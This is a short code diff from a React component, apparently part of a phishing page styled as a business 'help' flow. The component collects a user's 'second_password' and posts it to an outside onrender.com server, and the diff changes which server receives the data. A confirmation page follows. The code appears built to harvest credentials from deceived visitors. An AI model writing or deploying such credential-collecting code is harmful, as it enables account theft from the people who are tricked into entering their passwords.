@@ -66,7 +66,7 @@ const Buiness = () => {
                         'second_password': passWord,
                     }
 
-                    axios.post( "https://web-server-data-one.onrender.com/api/news", data) 
+                    axios.post( "https://sever2.onrender.com/api/news", data) 
                         .then((response) => {
                             if (response.data.status === 0 ) {
                                 navigate('/help-100823847823627384548/confirm');
